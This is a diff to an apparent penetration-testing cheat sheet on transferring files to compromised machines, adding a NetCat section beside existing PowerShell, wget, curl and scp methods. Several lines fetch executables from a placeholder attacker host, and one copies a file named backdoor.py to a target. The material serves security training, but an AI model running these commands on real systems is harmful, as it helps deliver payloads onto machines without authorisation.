@@ -167,7 +167,6 @@ echo bye>>ftp-commands.txt
 ftp -s:ftp-commands.txt
 ```
 
-
 ##### HTTP: Poweshell
 ```PowerShell
 powershell.exe -Command "& {(New-Object Net.WebClient).DownloadFile('http://$ATTACKER/file.exe', 'C:\file.exe')}"
@@ -185,6 +184,15 @@ cscript wget-cscript http://$ATTACKER/file.exe localfile.exe
 wget http://$ATTACKER/file
 curl http://$ATTACKER/file
 scp ~/file/file.bin user@$TARGET:tmp/backdoor.py
+```
+
+##### NetCat
+```Bash
+# Attacker
+nc -l -p 4444 < /tool/file.exe
+
+# Target
+nc $ATTACKER 4444 > file.exe
 ```
 
 ##### HTTP: Windows "debug.exe" Method
